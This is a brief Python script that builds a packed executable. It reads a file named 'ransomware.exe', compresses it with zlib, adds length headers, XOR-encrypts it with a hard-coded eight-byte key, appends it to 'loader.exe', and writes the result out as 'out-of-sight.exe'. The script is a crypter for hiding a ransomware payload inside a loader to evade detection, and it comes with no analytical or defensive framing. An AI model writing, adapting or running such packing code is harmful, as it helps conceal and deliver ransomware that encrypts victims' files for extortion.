import zlib, struct

XOR_KEY = bytes([
    0x06, 0x2b, 0x87, 0x6b,
    0xa9, 0xf2, 0xcb, 0xf3
])

def xor_buffer(buf: bytes) -> bytes:
    key_len = len(XOR_KEY)
    return bytes(b ^ XOR_KEY[i % key_len] for i, b in enumerate(buf))

with open("loader.exe", "ab") as of:
	with open("ransomware.exe", "rb") as f:
		data = f.read()
		original_length = len(data)
		compressed = zlib.compress(data, 9)
		compressed_length = len(compressed)
		new_data = struct.pack('<II', compressed_length, original_length)
		new_data += compressed
		new_data = xor_buffer(new_data)
		of.write(new_data)

with open("out-of-sight.exe", "wb") as of:
	with open("loader.exe", "rb") as f:
		of.write(f.read())